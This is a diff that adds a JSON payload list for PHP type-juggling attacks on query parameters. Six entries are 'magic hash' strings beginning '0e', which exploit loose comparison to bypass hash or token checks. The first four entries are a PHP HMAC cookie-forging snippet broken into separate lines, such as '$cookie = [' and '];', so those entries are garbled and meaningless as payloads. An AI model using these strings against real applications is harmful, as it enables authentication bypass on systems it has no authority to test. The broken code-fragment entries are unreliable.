@@ -1,0 +1,112 @@
+[
+  {
+    "payload_id": "OWP-244911",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-244912",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$out = hash_hmac('md5', 'admin|'.$i, '');",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-244913",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$cookie = [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-244914",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "];",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-392924",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "00e00099",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-392925",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "0e074025",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-392926",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "0e591528",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-392927",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "0e684322",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-392928",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "0e73845709713699",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-392929",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "0e817678",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
